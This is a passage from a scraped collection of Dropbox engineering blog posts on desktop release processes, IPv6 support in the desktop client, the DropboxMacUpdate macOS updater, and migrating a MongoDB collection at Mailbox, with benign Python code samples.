engineer has to sort through several topics, find reports of similar application behavior, fill out an internal task, and do enough investigation to assign a severity. As we quadrupled the cadence at which we were releasing new official versions of Dropbox, we would potentially be quadrupling the overhead required to find and translate these user reports into bugs. Since, as of late 2015, ~60% of critical issues detected after feature freeze came from beta user reports, we couldn’t simply stop paying attention. Therefore, we needed a solution to these laborious but essential human-scale processes. As usual, this solution was to automate them! The goal of beta user bug reports is to get an idea of when things are going wrong, so that we can fix them before releasing to a wider audience. However, the Desktop Client itself has a lot more information than the end user about its internal state — it can catch and report exceptions, or report events based on when various code paths are executed. As of early 2016, Dropbox already had systems in place to collect tracebacks and aggregate event analytics, but they were primarily used to launch new features. For example, as an engineer iterated on a new widget, they would add logging to detect whether users were interacting with it and to ensure that it was operating correctly. They would also search for and fix tracebacks that indicate internal exceptions related to their new code. Once the feature was stable it was common that no one would look at those analytics again, except sometimes when there was a user-reported regression. This meant performance of the feature, or the entire Desktop Client, could slowly degrade over time and no one would notice. We realized we could be much more systematic about analytics by permanently tracking a set of metrics over time and by creating guidelines for analytics on new features. This had three big upsides: we could catch more issues before any external user noticed, engineers wouldn’t spend all their time sifting through posts, and the information would contain more context about internal application state. Release Gating Metrics We wanted to track quality statistics over time. But how do we ensure that a regression in performance actually results in a fix? This is why we introduced a quality framework in the summer of 2016, followed by “Release Gating Metrics” in the autumn. We began by requiring each product team to implement a dashboard tracking the features they owned. The team could choose whatever metrics they believed to be most important but the metrics had to have a baseline that indicated quality, and not whether or not users simply liked the feature. A few of the most important are designated “release gating metrics”. These are always consulted before a release, and if they cross a pre-assigned threshold, the new version is delayed until the underlying issues are found and fixed. Let’s take account sign-up, for example. We could track the total number of Desktop Client-based sign-ups, but if we launched a promotion or redesigned the sign-up interface to be more attractive, the number of new accounts might spike and hide if the sign-up flow itself became glitchy or started to lag. Therefore, to capture quality rather than popularity, we might track the amount of time from application start to the appearance of the sign-up window and then define an acceptable duration. The team could create an alert in case it started taking too long or failed to launch too often. Larger experimental user pools Robust monitoring is most useful when it captures information early, while there is still time to fix regressions ahead of the final release. However, the metrics and exception traceback volumes also need to be statistically significant to be actionable — giving five users hot-off-the-press versions of the Desktop Client would not catch many issues. This was particularly important as we began to move faster, and each version spent less time “baking” with beta users. Expanding the experimental user pool turned out to be surprisingly simple: the Dropbox Desktop Client already had an option to “Include me on early releases” in the settings panel. Previously, we released to these users after posting a version in forums for a while, right before rolling out to the rest of world. However integration tests bolstered the quality of the Desktop Client sufficiently that we no longer needed this step, and simply began including these users in the beta builds as soon as they were released. This expanded our pool of beta users by about 40-fold and diversified the number of configurations that the experimental code ran on so that exception tracebacks that might only be reported in specific edge cases were more likely to show up. Altogether, we still find issues through internal and external human reports, but the additional logging and analytics have made reports easier to debug, and the volume has remained manageable as overall development velocity increases. 5. Triage routing At this point in the story, we now had a thorough suite of indicators of how the Desktop Client could be going wrong. Metrics could dip below satisfactory levels, integration tests might fail, a manual bug report could be filed, or tracebacks may be reported when internal exceptions occurred. How would we translate these into actual actionable bugs and fixes? Improvements 1-4 unlocked the ability for many teams to develop on desktop, including teams with goals spanning the web, mobile, and desktop platforms, but there was no longer a single manager aware of all developments. The Desktop Platform team could investigate everything, but they would never have time for larger foundational projects and probably would lack context if a product team implemented a feature that was causing bugs. With the advent of distributed development, we now also had distributed ownership. The solution was to be really explicit about who was responsible for which component of the Desktop Client, and automate as much as possible about routing. Every part of the Desktop Client is given a “Desktop Component” tag on Phabricator, our bug tracking and code review platform. As teams shift and features are added, a central authority keeps track of ownership. If an issue can be clearly mapped to a specific component, it gets assigned the relevant tag and directly sent to the owning team. This way, the Desktop Platform team, instead of being responsible for investigating everything, is only responsible for doing any leftover first-level routing and for taking care of the things their team specifically owns. To assist in first-level routing, bugs are auto-assigned based on the code paths in the stack traces. When manual reports come in from our internal users, we make them as routable as possible by implementing an internal bug reporter, which prompts for information and adds some metadata. We have similar templates for problems bubbled up from external users. Generally speaking, if an issue is reported by hand that was not caught by our existing metrics, we strive to add monitoring and/or integration tests to catch similar problems in the future. 6. Safeguarding the stabilization period Code flux tends to be proportional to product quality risk. In other words, the more that changes in a codebase, the more testing and verification is needed to be sure it works well. Our previous process put the onus on engineers to make only the changes that they deemed safe, with the guideline that no new features could be added after a build was made available externally. However, seemingly innocent changes that fixed a bug in one place could easily cause issues on another platform, especially without integration tests as guardrails to ensure that every commit preserved basic functionality. To replace these nebulous guidelines, we implemented a strict and objective set of requirements for allowing changes after “code freeze,” so that the testing and monitoring after freeze would accurately represent the quality of the final release. The primary benefit of this was predictability. Code could now go out on a regular cadence without too much time spent trying to re-establish test coverage and quality verification after last-minute commits. The downside was that teams had to accept missing a deadline if they could not stabilize their feature completely before code freeze. This was painful at first, especially as we first had to go through a transitional 4-week release cadence (instead of the 2-week one we have today). Engineers had to get used to bug bashing thoroughly ahead of code freeze and trust that if they missed one date, the next would come around in a few weeks as scheduled. The first time we implemented this safeguarding, I personally forgot to turn on a single feature flag (explained in more detail below) and had to wait a whole release cycle — and I had been working on the new release process! The Triage Council As for how this enforcement works: we gathered 5 senior technicians on the desktop client codebase to form the “Triage Council” and gave it a charter and explicit guidelines to accept or reject proposed changes once code freeze happened. (This is also when a release branch is created in the repository.) The Triage Council would have a lot of technical context, but be tasked only with upholding the existing rules. This had two advantages: these senior engineers weren’t at risk of burning out on playing “bad cop” or making difficult decisions (they could always just point to the charter); and other engineers would approach them with a good understanding of the requirements to make a last-minute change, or “cherry-pick”, to the release branch. So, what can be cherry-picked? Fixes to critical regressions of existing functionality Disablement of a new feature Resolution to SEVs (severity incidents), which themselves have an explicit set of criteria. We later added a fourth category as well: Test or tools-only changes ( not application code). We wanted to be able to use improvements to our automated build and test infrastructure on all branches. There is an explicit block on pushing code to a release branch without Triage Council approval, but there is also an escalation process. If someone wanting a cherry-pick — but rejected by the Triage Council — thinks that the rules were misapplied, or that another there should be an exception for another reason, such as hitting a product deadline, they can appeal further to our VP of Infrastructure. To keep improving our processes, each cherry-pick is followed up with a post-mortem review, which strives to identify what the root cause behind an issue is, why a solution was not found earlier, and how we can prevent similar issues from occurring again. Code gating One important way to make all of this possible was to boost cultural support for remote and binary code gating. There was already a robust set of tools for grouping users and hosts in order to show to A/B experiments on web ( Stormcrow ). These experiment flags can also can be passed down to the Desktop Client to fork logic. We now expect that any risky change is gated by Stormcrow flags so that they can be turned off safely without making a code change in the desktop codebase. Some changes, of course, happen when we cannot guarantee web connectivity. These are expected to be “feature-gated” within the Desktop Client codebase, meaning that changing a single variable from True to False would turn off an entire section of code. These feature gates can also be configured to turn on code for only certain types of builds, so that, for example, we could get feedback from Dropboxers for brand-new (but highly experimental) features a few months before we were ready to commit to that product strategy externally. In summary All of the process changes and infrastructure and tooling investments built on top of one another to emphasize each others’ efficacy. They also tended to achieve one of the following ends: Reduce and automate “Keep The Lights On” work , operational work that often scales linearly with code change by: Improving reliability and capacity of our build and test infrastructure Automating build-making, saving an engineer/week of time. Defining a scalable ownership and triage system. Enacting explicit process for last-minute changes, including an emphasis on feature flagging new or risky code to respond quickly to issues. Automatically affirm quality , via testing and diagnostics such as: Leveraging a Commit Queue to raise the baseline quality of committed code. Developing an end-to-end test platform to reduce reliance on manual quality assurance. Implementing Release Gating Metrics and more robust logging and analytics to track real-world performance. Together, they allowed us to accelerate our release cadence, from publishing a new major version every 8 weeks to every 2 weeks, in order to shorten the feedback cycle on new features and code changes, while sustaining high quality and avoiding undue operational burden on the engineers responsible for maintaining the platform. // Tags Application Testing Integration Testing Desktop Client Quality Metrics Iteration Operations // Copy link Link copied Link copied", "date": "2017-04-21"},
{"website": "Dropbox", "title": "Adding IPv6 connectivity support to the Dropbox desktop client", "author": ["Nikhil Marathe"], "link": "https://dropbox.tech/application/adding-ipv6-connectivity-support-to-the-dropbox-desktop-client", "abstract": "Resolving addresses and establishing connections are key to IPv6 support Address resolution Using getaddrinfo() for IP address lookup Establishing connections Proxy support Moving fast without breaking things Computers on the internet are uniquely identified by an IP address. For decades the world has used Internet Protocol version 4 (IPv4), which allows for about 4 billion unique addresses. As more of the world has come online, and we carry internet-capable devices in our pockets, we have run out of IPv4 addresses. Layers and layers of workarounds have been built to mitigate the problem. The current protocol—Internet Protocol version 6 (IPv6)—fixes various problems with IPv4; it has a significantly expanded address space that allows for the creation of many more unique IP addresses. Unfortunately, IPv6 has suffered from lack of adoption. This is finally changing. As of April 10, 2017, Google reported IPv6 adoption at 14% , with the United States at just over 30%. ISPs and private networks within enterprises are moving to IPv6-only or dual-stack networks (those that support both IPv6 and IPv4 connections). Cellular carriers are switching to IPv6-only networks, meaning devices have no IPv4 connectivity, but rely on a NAT64/DNS64 gateway to connect to legacy IPv4 internet networks. Given these trends, we recently took the initiative to add IPv6 support for the Dropbox desktop application. Version 24 of the Dropbox client, released April 17, 2017, supports IPv6-only and dual-stack networks. Resolving addresses and establishing connections are key to IPv6 support Adding IPv6 support involves making changes to address resolution and connection establishment. This has to be done in a cross-platform manner and support alternative mechanisms like proxies. Transferring files over the internet is one of Dropbox’s core tasks and users expect that to happen seamlessly and quickly. These changes needed to happen without affecting the user experience. Here is how we implemented IPv6 support while ensuring the client stayed functional for all existing users who are still on IPv4. Address resolution Under IPv4, functions like gethostbyname() could be used for address lookup. In addition, functions like inet_aton() and inet_ntoa() could be used to convert between various IP address representations. None of these work with IPv6 addresses. Using getaddrinfo() for IP address lookup The function getaddrinfo() has long been the recommended cross-platform way to look up IP addresses for a given host. It accepts a hostname and returns a list of addresses, both IPv6 and IPv4, ordered by the host’s preferred address family . Callers are then expected to iterate through these until a connection succeeds. Parameters that determine which address families are returned are accepted by getaddrinfo() . In the Berkeley sockets API, a family specifies the socket type. AF_INET (IPv4) and AF_INET6 (IPv6) are two valid socket types. There is an additional constant, AF_UNSPEC, that indicates getaddrinfo() should return all the families that it can . Under the hood, getaddrinfo() will attempt both an A and an AAAA query to the DNS server. Unfortunately getaddrinfo() has a couple of downsides. It is a blocking function and it does not support caller specified timeouts. Once getaddrinfo() has been called, there is not much the calling thread can do until it returns. The default timeouts implemented by operating systems are within the 30-90 second range. In a naive implementation, we may end up waiting several minutes for the AF_UNSPEC getaddrinfo() , then spend another few seconds falling back to resolving with AF_INET. This adds up to a lot of delay. To mitigate this, we use a thread pool (specifically Python’s concurrent.futures module) to perform the resolution. We concurrently start both AF_UNSPEC and AF_INET resolutions. Since we want to favor IPv6 connections, we wait a few seconds for AF_UNSPEC to succeed, and otherwise, we select the one that finishes first. Operating systems aggressively cache DNS lookups, so the lookup time and CPU penalty is paid very rarely. Based on our metrics, about 80% of connection attempts resolve successfully on the AF_UNSPEC call and we don’t need to bother with the result of the AF_INET call. But when the AF_UNSPEC call takes longer than a few seconds, we noticed that both the AF_UNSPEC and AF_INET calls will fail in >86% of cases. This usually indicates the user is on a bad network, or their computer suspended/shut down right when we were attempting to connect. In fact, the odds that only one of the calls will succeed is very low, representing about 0.3% of all connection attempts. The dual lookups introduce some complexity to our code, but there are no well designed, cross-platform DNS resolution alternatives. Third-party solutions like c-ares exist, but we did not want to introduce overhead for such a simple task. One interesting implementation detail we discovered is that Python’s non-blocking sockets can encounter delays similar to blocking sockets if the connect() method is passed a DNS hostname, instead of an IP address. This is because it uses getaddrinfo() under the hood. Be sure to perform lookup first if you intend to use non-blocking sockets. Copy >>> import socket\r\n>>> import time\r\n>>> def connect_nonblocking(host):\r\n...   \"\"\"This function creates a non-blocking socket and attempts to connect to 'host'.\r\n...    connect() on a non-blocking socket throws an exception with EINPROGRESS.\"\"\"\r\n...   sock = socket.socket()\r\n...   sock.setblocking(False)\r\n...   start = time.time()\r\n...   try:\r\n...     sock.connect((host, 80))\r\n...   except socket.error:\r\n...     print \"non-blocking socket threw exception after %f seconds.\" % (time.time() - start)\r\n...\r\n>>> # We clear the system DNS cache.\r\n>>> # Then we use the Network Link Conditioner to intentionally introduce a 3 second delay in DNS lookup.\r\n>>> connect_nonblocking('dropbox.com')\r\nnon-blocking socket threw exception after 3.009090 seconds.\r\n>>> # At this point, the cache is used so the response is instantaneous.\r\n>>> connect_nonblocking('dropbox.com')\r\nnon-blocking socket threw exception after 0.008408 seconds. Establishing connections Once we have a list of IP addresses, which may be a mix of IPv6 and IPv4, we can attempt to connect to each of them in order and stop when a connection is successfully established, correct? Unfortunately things are not so easy. On an IPv4-only or IPv6-only network, if none of the addresses work, the user’s network has a problem. However, on a dual-stack network, it is possible for IPv4 to be functioning, and IPv6 to be down. Why is that? Functional IPv4 network and broken IPv6 network on a dual-stack network. Among other reasons, IPv6 networks generally operate a NAT64/DNS64 gateway to allow IPv6 hosts to connect to the IPv4 internet. It is possible for this gateway to be down or slow. What would happen if getaddrinfo() had returned a list of 2 IPv6 addresses followed by 2 IPv4 addresses? Functional IPv4 network and broken IPv6 network on a dual-stack network. Among other reasons, IPv6 networks generally operate a NAT64/DNS64 gateway to allow IPv6 hosts to connect to the IPv4 internet. It is possible for this gateway to be down or slow. What would happen if getaddrinfo() had returned a list of 2 IPv6 addresses followed by 2 IPv4 addresses? Copy ['2001:DB8::1', '2001:DB8::2', '198.51.100.1', '198.51.100.2'] We would have first spent several seconds (we use a 10 second timeout per attempt) trying to connect to 2001:DB8::1 , and another 10s connecting to 2001:DB8::2 , before finally connecting to 198.51.100.1 . That does not sound appealing. There is a clever and simple-to-implement strategy—codified as Happy Eyeballs : Success with Dual-stack hosts —to deal with this situation. We pick the first IPv6 address ( 2001:DB8::1 ) and the first IPv4 address ( 198.51.100.1 ) from the results. Since we want to favor IPv6, we start the connection to IPv6. If that connection takes too long (the RFC recommends 300ms), we then start the IPv4 connection. Then we pick the winner of the two. In this case, since we have a functioning IPv4 network, we would pick 198.51.100.1 . If this sounds similar to our approach for address resolution, it’s because Happy Eyeballs definitely served as inspiration for that solution. If we were unable to connect to either address, we would try the rest of the addresses— ['2001:DB8::2', '198.51.100.2'] —in order. Since Dropbox servers don’t advertise native AAAA records and dual-stack users may connect via IPv4, we can’t say how many Dropbox users actually connect via an IPv6 network; we are working to resolve this. In terms of resolving addresses to both IPv4 and IPv6 addresses, fewer than 0.5% of hosts were able to resolve Dropbox servers to a IPv6 address during connection attempts. Proxy support Some Dropbox users connect via proxies and we wanted to support IPv6 wherever it was possible. Dropbox supports SOCKS4, SOCKS5 and HTTP(S) proxies. SOCKS4 and SOCKS5 use a binary protocol to request a connection from the proxy. SOCKS4, and the extension SOCKS4a, do not support IPv6 and will remain unusable on IPv6 networks. For SOCKS5, we added support for x03 ATYP to allow IPv6 addresses . HTTP(S) proxies require no negotiation, so they do not require any client-side changes. The client simply sends the request URL and the proxy uses a connection that that it supports. Finally, in order to connect to the proxy when both the client and proxy are on an IPv6-only network, we can re-use the logic for establishing connections. Moving fast without breaking things To make these critical changes with minimal hiccups, we spent several weeks with features enabled only for in-office and beta builds . This ability to deploy to the office every day allowed us to quickly detect and fix issues. We made extensive use of Google’s publicly available DNS64 servers during development. Combined with the Network Link Conditioner on MacOS, developers could quickly verify code changes. The safety net provided by out-of-process updaters ensured that if we ended up with a bug that prevented users from connecting to Dropbox, we could fix the bug, release a build, and update users without requiring manual intervention and without users even noticing. When one of the beta builds ended up performing local DNS resolution even for proxies, we were able to roll out a new build quickly and the affected users had functionality restored within days. Adding IPv6 support was an interesting technical challenge due to the variety of implementations required, and the need to be backwards compatible. There is wealth of information on the internet about migrating to IPv6. We hope this article adds to it and helps others transition to the modern protocol. // Tags Application Desktop Client Ipv6 // Copy link Link copied Link copied", "date": "2017-04-25"},
{"website": "Dropbox", "title": "DropboxMacUpdate: Making automatic updates on macOS safer and more reliable", "author": ["David Euresti"], "link": "https://dropbox.tech/application/dropboxmacupdate-making-automatic-updates-on-macos-safer-and-more-reliable", "abstract": "So what did we want? And what did we build? Payload Format Security Updating a running app And in the end Keeping users on the latest version of the Dropbox desktop app is critical. It allows our developers to rapidly innovate, showcase new features to our users, maintain compatibility with server endpoints, and mitigate risk of incompatibilities that may creep in with platform/OS changes. Our auto-update system, as originally designed, was written as a feature of the desktop client. Basically, as part of regular file syncing, the server can send down an entry in the metadata that says, “Please update to version X with checksum Y.” The client would then download the file, verify the checksum, open the payload, replace the files on disk, restart the app and boom! It would be running version X. This meant that the client had to be running in order to update itself. More importantly, it also meant that small bugs in other parts of the client could affect auto-update. Eliminating these potential failures was crucial to maintain continuity of Dropbox’s value to its users. So we decided it was time to move our auto-update mechanism out of the main app. Back in 2014, we accomplished this on Windows by taking Google’s Omaha project and adapting it to our needs. Since Omaha is an out-of-process updater, if we shipped a completely broken client we could still update it. This project took a while to finish since Omaha is also an installer/meta-installer and we had to rework several of our installation flows to make it all work well. But we were happy with the end result. Last year, we decided we wanted to do the same for macOS. Usually we like to start projects like this by doing lots of research. Why reinvent the wheel if you don’t have to? Google did have an open source project called UpdateEngine which was essentially “Omaha for Mac,” but the last code drop was back in 2008 and it wouldn’t compile cleanly with modern XCode, so we decided not to use it. Other options we looked at had other difficulties. Some were in-process only, or supported only one app, or only supported Sierra (we support Dropbox on some pretty old versions of OS X) so we couldn’t use them. So we decided to write our own auto-update system. This gave us a lot of flexibility in the feature set, and rather than bolting stuff on after the fact, as we did with Omaha, we could build the exact system we needed. (We also didn’t have to use XML for the API 😃.) So what did we want? Safety . We must ensure that users only run the code that they should be running. Speed . We want to update our users as fast as possible. Simplicity . This covers both the design and the implementation. Simple code with lots of unit tests. Separation of concerns . The details of how an app is updated should be separate from the method of getting the payload. Error handling . Handle all the most common errors correctly, e.g. Network connectivity. Logging . Log as much as possible to detect quality degradation. And what did we build? We built an “app” called DropboxMacUpdate. Because we needed to support old systems (Mac OS 10.7+) we wrote it in ObjC rather than using Swift. Picking one of Apple’s languages let us leverage many of the OS features without too much trouble. (In comparison, the client is written in Python, and when we need to do some OS-specific thing we have to write lots of bridge code.) Upon installation, DropboxMacUpdate.app will register itself with launchd . This is a well known technique that will allow the app to periodically check for updates. Any Dropbox app can register with DropboxMacUpdate by giving it the path of where it’s installed. Every five hours, DropboxMacUpdate will check its registration database for apps, then check the paths of those apps for the installed version and send them to the server. The server will check if an update is needed and will reply with the version, the URL and the hash of the payload. DropboxMacUpdate then downloads the payload and uses it to update the app. This all happens without the need for any user interaction. Payload Format At a minimum, the payload is a DMG with an executable file called .dbx_install at the root. Those of you familiar with Google’s UpdateEngine may see some similarities here. The executable is in charge of doing all the work needed to install the new version of the app. In practice, the DMG will also include the .app that needs to be installed; however, this format allows us to (someday) create a DMG that can update the app using diffs, for example. Notice that DropboxMacUpdate doesn’t have to know the details of how to update the app. This means that if your payload won’t install for some reason, it’s not a problem; just have the server give it a different payload next time (one that actually installs), and you’ll be out of your predicament in no time. Security Shipping updates is no trivial matter. We have to ensure that there’s no way for a user to get a “bad” version of the client. So we employ multiple layers of security checks. By default, the connection to the Dropbox server uses TLS with certificate pinning. This way we know we’re talking to dropbox.com and only dropbox.com The server replies with the sha256 hash of the payload. This gets verified once we download the payload. .dbx_install will verify that the .app is signed by Dropbox before copying it to its final location. Additionally, on 10.12+ systems the DMG payload is verified as an in-depth security measure. (Sadly, DMG signature verification is not implemented in earlier versions of OS X.) But most importantly, being able to deliver secure, reliable, and rapid updates to our users is the biggest security improvement. Updating a running app Because DropboxMacUpdate can pretty much run at any time, it might try to update a running application. For the Dropbox client we wanted to be able to ask the app to quit so the update could be done as soon as possible. So .dbx_install will find the running app and ask it to exit, using a Darwin n o tification . The client receives the notification, ensures that the app isn’t showing UI, finishes the current sync operations, and exits cleanly. .dbx_install will then swap out the Dropbox.app atomically and restart it. If the client is busy showing UI then we’ll wait for some time before quitting to make sure the user experience is not jarring. And in the end Many of our beta users have been running DropboxMacUpdate for the last months and have benefited from an increased speed in how fast they receive the latest version. In fact, we can update about 3000 clients/sec at peak! We’re excited about shipping this to all our macOS users with version 21 of the desktop client. Happy updating! // Tags Application Automatic Updates Mac Updater Desktop Client // Copy link Link copied Link copied", "date": "2017-03-08"},
{"website": "Dropbox", "title": "Scaling MongoDB at Mailbox", "author": ["Cuong Do"], "link": "https://dropbox.tech/application/scaling-mongodb-at-mailbox", "abstract": "Creating the initial snapshot of a MongoDB collection Verifying copied data Handling the unexpected Migration time! Hello, world Mailbox has grown unbelievably quickly. During that growth, one performance issue that impacted us was MongoDB’s database-level write lock. The amount of time Mailbox’s backends were waiting for the write lock was resulting in user-perceived latency. While MongoDB allows you to add shards to a MongoDB cluster easily, we wanted to spare ourselves potential long-term pain by moving one of the most frequently updated MongoDB collections, which stores email-related data, to its own cluster. We theorized that this would, at a minimum, cut the amount of write lock contention in half. While we could have chosen to scale by adding more shards, we wanted to be able to independently optimize and administer the different types of data separately. I started by poring through the MongoDB documentation. I quickly found the cloneCollection command. However, to quote the MongoDB 2.2 documentation: “ cloneCollection cannot clone a collection through a mongos : you must connect directly to the mongod instance.” In other words, you can’t use this command with a sharded collection. You can’t use renameCollection on sharded collections either, closing off other possibilities. There were other possible solutions, but they all would’ve impacted performance for Mailbox users or would have simply failed to work at Mailbox’s scale. So, I wrote a quick Python script to copy the data, and another to compare the original versus the copy to ensure data integrity. Along the way, I encountered many surprises. For example, a single Python process using gevent and pymongo can copy a large MongoDB collection in half the time that mongodump (written in C++) takes, even when the MongoDB client and server are on the same machine. Our experiences have culminated in Hydra , our newly open-sourced set of tools we've developed for MongoDB collection migration. Creating the initial snapshot of a MongoDB collection To copy all documents in a collection, I started with an intentionally naive implementation that didn’t have much more code than this: Copy for email_data in source_email_data.find():\r\n    destination_email_data.insert(email_data) Issue #1: Slowness I t was obvious that such a naive approach wouldn’t perform well for larger amounts of data, so I quickly experimented with different means of achieving faster copy performance. I implemented various micro-optimizations, like adjusting how many documents the MongoDB driver fetched at once. However, those only yielded only marginal performance improvements. My goal was to finish the data migration in about a day, I was still far from that goal. An early experiment I did was to measure the “speed of light” for MongoDB API operations – the speed of a simple C++ implementation using the MongoDB C++ SDK. Being rusty at C++ and wanting my mostly Python-proficient colleagues to easily be able to use/adapt the code for other uses, I didn’t pursue the C++ implementation too far but found that for simple cases, a naive C++ implementation was typically 5–10 times as fast as a naive Python implementation for the same task. So, I returned to Python, which is the default language of choice for Dropbox. Moreover, when performing a series of remote network requests, such as queries to mongod, the client often spends much of its time waiting for the server to respond; there didn’t seem to be very many CPU-intensive parts for copy_collection.py (my MongoDB collection copying tool). This was corroborated by the very low CPU usage of the initial copy_collection.py. I then experimented with adding concurrent MongoDB requests to copy_collection.py. Initial experiments with worker threads resulted in disappointment. Next, I tried using worker processes communicating through a Python Queue object. The performance still wasn’t much better, because the overhead of the IPCs was overwhelming any potential concurrency benefits. Using Pipes and other IPC mechanisms didn’t help much either. Next, I decided to see how much performance I could squeeze out of a single Python process using asynchronous MongoDB queries. One of the more popular libraries for this is gevent, so I decided to give it a try. gevent patches standard Python modules, such as socket, to execute asynchronously. The beauty of gevent is that you can write asynchronous code that reads simply, like synchronous code. Traditionally, asynchronous code to copy documents between two collections might have looked like this: Copy import asynclib\r\n \r\ndef copy_documents(source_collection, destination_collection, _ids, callback):\r\n    \"\"\"\r\n    Given a list of _id's (MongoDB's unique identifier field for each document),\r\n    copies the corresponding documents from the source collection to the destination\r\n    collection\r\n    \"\"\"\r\n \r\n    def _copy_documents_callback(...):\r\n        if error_detected():\r\n            callback(error)\r\n \r\n    # copy documents, passing a callback function that will handle errors and\r\n    # other notifications\r\n    for _id in _ids:\r\n        copy_document(source_collection, destination_collection, _id,\r\n                      _copy_documents_callback)\r\n \r\n    # more error handling omitted for brevity\r\n    callback(None)\r\n \r\ndef copy_document(source_collection, destination_collection, _id, callback):\r\n    \"\"\"\r\n    Copies document corresponding to the given _id from the source to the\r\n    destination.\r\n    \"\"\"\r\n    def _insert_doc(doc):\r\n        \"\"\"\r\n        callback that takes the document read from the source collection\r\n        and inserts it into destination collection\r\n        \"\"\"\r\n        if error_detected():\r\n            callback(error)\r\n        destination_collection.insert(doc, callback) # another MongoDB operation\r\n \r\n    # find the specified document asynchronously, passing a callback to receive\r\n    # the retrieved data\r\n    source_collection.find_one({'$id': _id}, callback=_insert_doc) With gevent, the code uses no callbacks and reads sequentially: Copy import gevent\r\ngevent.monkey.patch_all()\r\n \r\ndef copy_documents(source_collection, destination_collection, _ids):\r\n    \"\"\"\r\n    Given a list of _id's (MongoDB's unique identifier field for each document),\r\n    copies the corresponding documents from the source collection to the destination\r\n    collection\r\n    \"\"\"\r\n \r\n    # copies each document using a separate greenlet; optimizations are certainly\r\n    # possible but omitted in this example\r\n    for _id in _ids:\r\n        gevent.spawn(copy_document, source_collection, destination_collection, _id)\r\n \r\ndef copy_document(source_collection, destination_collection, _id):\r\n    \"\"\"\r\n    Copies document corresponding to the given _id from the source to the\r\n    destination.\r\n    \"\"\"\r\n    # both of the following function calls block without gevent; with gevent they\r\n    # simply cede control to another greenlet while waiting for Mongo to respond\r\n    source_doc = source_collection.find_one({'$id': _id})\r\n    destination_collection.insert(source_doc) # another MongoDB operation This simple code will copy documents from a source MongoDB collection to a destination, based on their _id fields, which are the unique identifiers for each MongoDB document. copy_documents delegates the work of copying documents to greenlets (which are like threads but are cooperatively scheduled) that run copy_document() . When a greenlet performs a blocking operation, such as any request to MongoDB, it yields control to any other greenlet that is ready to execute. Since greenlets all execute in the same thread and process, you generally don’t need any kind of inter-greenlet locking. With gevent , I was able to achieve much faster performance than either the thread worker pool or process worker pool approaches. Here’s a summary of the performance of each approach: Approach Performance (higher is better) single process, no gevent 520 documents/sec thread worker pool 652 documents/sec process worker pool 670 documents/sec single process, with gevent 2,381 documents/sec Combining gevent with worker processes – one for each shard – yielded a linear increase in performance. The key to using worker processes efficiently was to eliminate as much IPC as possible. Somewhat surprisingly, using gevent in just a single process could produce a full copy of a collection in just under half the time as the mongodump tool, which is written in C++ but queries synchronously and is single-process/thread. Issue #2: Replicating updates after the snapshot Because MongoDB is not transactional, when you try to read a large MongoDB collection while updates are being performed to it, you will receive a result set that reflects MongoDB’s state at different points in time. For example, suppose you start reading a whole collection using a MongoDB find() query. Your result set could look like this: included: document saved before your find() included: document saved before your find() included: document saved before your find() excluded: document deleted just after your find() began included: document inserted after your find() began Moreover, to minimize the downtime required to point the Mailbox backend to the new copy of the collection, it was necessary to figure out a way to stream changes from the source MongoDB cluster to the new MongoDB cluster with as little latency as possible. Like most asynchronously replicating data stores, MongoDB uses a log of operations – its oplog – to record and distribute a record of the insert/update/remove operations executed on a mongod instance to other mongod replicas. Given a snapshot of the data, the oplog can be used to apply all changes performed since the snapshot was taken. So, I decided to stream oplog entries from the source cluster and apply those changes at the destination cluster. Thanks to an informative post on Kristina Chodorow’s blog , I was quickly able to grasp the basics of the oplog format. Replicating inserts and removes was trivial, because their serialization format is straightforward. On the other hand, updates took more work. The structure of update oplog entries was not immediately obvious, and in MongoDB 2.2.x, it uses duplicate keys that can’t be displayed by the Mongo shell, let alone most MongoDB drivers . After some thought, I devised a workaround that simply used the _id embedded in the update to trigger another copy of the document from the source. While this doesn’t have identical semantics as applying just the specified update, this guarantees that the copied data is at least as recent as the op we’ve received. Here is a diagram showing how intermediate versions of documents (in this case, v2 ) are not necessarily copied, but the source and destination are still eventually consistent: applying update ops I also ran into a performance issue replaying ops on the destination cluster. Though I had a separate process to replay ops for each shard, applying ops serially (my initial approach for prototyping and ensuring correctness) was far too slow to keep up with the onslaught of Mailbox queries. Applying ops concurrently seemed to be the way to go, but the question was how to preserve correctness. Specifically, two operations affecting the same _id cannot execute out of order. A simple workaround I devised was to maintain, in a Python set , the set of _id s being modified by in-progress operations. When copy_collection.py encounters another update to an _id that is currently being updated, we block the later update and any other ops that come after it from being applied. We start applying new ops only when the older operation on the _id has finished. Here’s a diagram to illustrate op blocking: concurrent op replay Verifying copied data Comparing the copied data to the original is normally a straightforward operation. Doing it efficiently also isn’t particularly challenging when you use multiple processes and gevent . However, doing it when the source and the copy are both being updated requires some thought. At first, I tried just logging warnings whenever compare_collections.py (the tool I wrote to compare two collections) found a data inconsistency in a document that had been recently updated. Later, I could repeat verification for those documents. However, that doesn’t work for deleted documents, for which there remains no last modified timestamp. I started thinking about the term “ eventual consistency ,” which is often used when talking about asychronously replicating systems such as MongoDB’s replica sets and MySQL’s master/slave replication. Given enough time (i.e. after some amount of retries) and barring catastrophe, the source and the copy will eventually become consistent. So, I added retry comparisons with an increasing backoff between successive retries. There are potential issues with certain cases, such as data that oscillates between two values. However, the data being migrated didn’t have any problematic update patterns. Before performing the final cutover from the original MongoDB cluster to the new MongoDB cluster, I wanted the ability to verify that the most recent ops had been applied. So, I added a command-line option to compare_collections.py to compare the documents modified by the most recent N ops. Running this for a sufficiently large set of ops during downtime would provide additional confidence that there weren’t undetected data inconsistencies. Running it for even hundreds of thousands of ops per shard only takes a few minutes. This also mitigates concerns regarding undetected data inconsistencies resulting from the compare/retry approach. Handling the unexpected Despite taking various precautions to handle errors (retries, catching possible exceptions, logging), there were still an uncomfortable number of issues arising during my final test runs leading up to the production migration. There were sporadic network issues, a specific set of documents that was consistently causing mongos to sever its connection from copy_collection.py , and occasional connection resets from mongod . Soon, I realized that I couln’t identify all the relevant failure scenarios, so I shifted my focus to quickly recovering from failures. I added logging of _id s of documents for which compare_collections.py had detected inconstencies. Then, I created another tool whose sole job was to re-copy the documents with those _id s. Migration time! During the production migration, copy_collection.py created an initial snapsphot of hundreds of millions of emails and replayed more than a hundred million MongoDB operations. Performing the initial snapshot, building indices, and catching up on replication took about 9 hours – well within the 24 hour goal I had set. I continued to let copy_collection.py replay ops from the source cluster’s oplogs for another day while I used compare_collections.py to verify all copied data three times (for additional safety). The actual cutover to the new MongoDB cluster happened recently. The MongoDB-related work was very short (a few minutes). During a brief maintence window, I ran compare_collections.py to compare documents modified by the last 500,000 operations in each shard. After detecting no inconsistencies in the most recently updated data, we ran some smoke tests, 